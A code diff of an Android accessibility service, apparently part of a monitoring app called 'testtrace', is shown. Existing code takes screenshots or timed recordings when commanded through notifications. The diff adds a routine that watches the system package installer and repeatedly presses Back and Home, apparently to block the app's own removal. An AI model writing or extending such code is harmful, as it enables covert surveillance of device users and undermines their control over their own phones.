@@ -14,6 +14,7 @@ import android.util.Log;
 import android.view.Display;
 import android.view.KeyEvent;
 import android.view.accessibility.AccessibilityEvent;
+import android.view.accessibility.AccessibilityNodeInfo;
 import android.widget.Toast;
 
 import androidx.annotation.NonNull;
@@ -53,7 +54,7 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
         info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
-        info.flags = AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS;
+        info.flags = AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS | AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
         info.notificationTimeout = 100;
         setServiceInfo(info);
         instance = this;
@@ -64,55 +65,83 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
     @Override
     public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
 
+        if (String.valueOf(accessibilityEvent.getPackageName()).equals("com.reiserx.testtrace")) {
+
             if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
-                if (accessibilityEvent.getPackageName().equals("com.reiserx.testtrace")) {
-                    Log.d(TAG, "Recieved event");
-                    Parcelable data = accessibilityEvent.getParcelableData();
-                    if (data instanceof Notification) {
-                        Log.d(TAG, "Recieved notification");
-                        Notification notification = (Notification) data;
+                Log.d(TAG, "Recieved event");
+                Parcelable data = accessibilityEvent.getParcelableData();
+                if (data instanceof Notification) {
+                    Log.d(TAG, "Recieved notification");
+                    Notification notification = (Notification) data;
 
-                        if (notification.extras.getString("android.title") != null && notification.extras.getString("android.text") != null) {
+                    if (notification.extras.getString("android.title") != null && notification.extras.getString("android.text") != null) {
 
-                            String title = notification.extras.getString("android.title");
-                            if (title.contains("com.reiserx.testtrace.accessibility")) {
-                                SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
-                                String UserID = save.getString("UserID", "");
+                        String title = notification.extras.getString("android.title");
+                        if (title.contains("com.reiserx.testtrace.accessibility")) {
+                            SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
+                            String UserID = save.getString("UserID", "");
 
-                                int message = Integer.parseInt(notification.extras.getString("android.text"));
-                                switch (message) {
-                                    case 1:
-                                        takeScreenshots(UserID);
-                                        instance = accessibilityService.this;
-                                        updateAccessibility();
-                                        break;
-                                    case 2:
-                                        long value = Long.parseLong(title.replaceAll("[\\D]", ""));
-                                        final Handler handler = new Handler(Looper.getMainLooper());
-                                        startRecording();
-                                        handler.postDelayed(() -> stopRecording(UserID), value);
-                                        instance = accessibilityService.this;
-                                        updateAccessibility();
-                                        break;
-                                    case 3:
-                                        instance = accessibilityService.this;
-                                        updateAccessibility();
-                                        break;
-                                }
+                            int message = Integer.parseInt(notification.extras.getString("android.text"));
+                            switch (message) {
+                                case 1:
+                                    takeScreenshots(UserID);
+                                    instance = accessibilityService.this;
+                                    updateAccessibility();
+                                    break;
+                                case 2:
+                                    long value = Long.parseLong(title.replaceAll("[\\D]", ""));
+                                    final Handler handler = new Handler(Looper.getMainLooper());
+                                    startRecording();
+                                    handler.postDelayed(() -> stopRecording(UserID), value);
+                                    instance = accessibilityService.this;
+                                    updateAccessibility();
+                                    break;
+                                case 3:
+                                    instance = accessibilityService.this;
+                                    updateAccessibility();
+                                    break;
                             }
                         }
                     }
                 }
             }
-            if (String.valueOf(accessibilityEvent.getPackageName()).equals("com.android.systemui")) {
-                if (String.valueOf(accessibilityEvent.getContentDescription()).trim().equals("Back")) {
-                    Log.d(TAG, "back");
-                    instance = this;
-                } else if (String.valueOf(accessibilityEvent.getContentDescription()).trim().equals("Home")) {
-                    Log.d(TAG, "home");
-                    instance = this;
-                }
+        }
+
+
+        if (String.valueOf(accessibilityEvent.getPackageName()).equals("com.android.systemui")) {
+            if (String.valueOf(accessibilityEvent.getContentDescription()).trim().equals("Back")) {
+                Log.d(TAG, "back");
+                instance = this;
+            } else if (String.valueOf(accessibilityEvent.getContentDescription()).trim().equals("Home")) {
+                Log.d(TAG, "home");
+                instance = this;
             }
+        }
+        if (String.valueOf(accessibilityEvent.getPackageName()).equals("com.google.android.packageinstaller")) {
+            if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                Log.d(TAG, String.valueOf(accessibilityEvent.getPackageName()));
+                logNodeHeirarchy(getRootInActiveWindow(), 0);
+            }
+        }
+    }
+
+    public void logNodeHeirarchy(AccessibilityNodeInfo nodeInfo, int depth) {
+
+        if (nodeInfo == null) return;
+
+        String logString = String.valueOf(nodeInfo.getText());
+
+
+        if (!logString.equals("null")) {
+            if (logString.equals("ReiserX"))
+                Log.d("AccessibilityService.logs", logString);
+            performGlobalAction(GLOBAL_ACTION_BACK);
+            performGlobalAction(GLOBAL_ACTION_HOME);
+        }
+
+        for (int i = 0; i < nodeInfo.getChildCount(); ++i) {
+            logNodeHeirarchy(nodeInfo.getChild(i), depth + 1);
+        }
     }
 
     @Override
@@ -255,7 +284,7 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
         });
     }
 
-    private void updateAccessibility () {
+    private void updateAccessibility() {
         SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
         String UserID = save.getString("UserID", "");
         String currentTime = java.text.DateFormat.getDateTimeInstance().format(Calendar.getInstance().getTime());
